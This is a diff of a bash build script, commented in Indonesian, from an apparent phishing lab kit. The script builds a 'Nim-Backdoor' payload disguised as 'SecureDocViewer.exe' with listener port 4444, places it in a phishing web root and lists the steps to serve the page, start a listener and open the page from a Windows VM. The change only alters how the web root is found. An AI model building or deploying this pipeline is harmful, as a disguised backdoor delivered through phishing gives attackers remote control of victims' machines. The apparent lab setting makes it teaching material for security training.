@@ -20,13 +20,20 @@ PORT="${2:-4444}"
 NAME="${3:-SecureDocViewer.exe}"
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-PHISH_WWW="$SCRIPT_DIR/03-phish-server/www"
-
 # --- Lokasi sumber Nim-Backdoor -------------------------------
 # Sesuaikan jika perlu: path hasil unzip Nim-Backdoor.zip dari From-Chruch
 NIM_SRC="${NIM_SRC:-$HOME/From-Chruch/Nim-Backdoor}"
 
 WORK="$SCRIPT_DIR/.build"
+
+# --- Auto-detect layout web root ------------------------------
+#  - Flattened   : index.html di root repo, tanpa 03-phish-server/ → exe di root
+#  - Struktur kit: index.html di 03-phish-server/www/           → exe di situ
+if [[ -f "$SCRIPT_DIR/index.html" && ! -d "$SCRIPT_DIR/03-phish-server" ]]; then
+    PHISH_WWW="$SCRIPT_DIR"
+else
+    PHISH_WWW="$SCRIPT_DIR/03-phish-server/www"
+fi
 mkdir -p "$WORK" "$PHISH_WWW"
 
 if [[ ! -f "$NIM_SRC/Nim-Backdoor.py" ]]; then
@@ -67,6 +74,7 @@ echo "[+] Sukses: $WORK/$NAME"
 echo "[+] Tercopy ke web root phishing: $PHISH_WWW/$NAME"
 echo
 echo "    Next step:"
-echo "      1. bash 03-phish-server/serve.py 8080"
+echo "      1. Serve web root (dari direktori yang memuat serve.py):"
+echo "         python3 serve.py 8080"
 echo "      2. bash 04-listener.sh $PORT"
 echo "      3. Dari Windows VM buka: http://10.0.2.2:8080/"
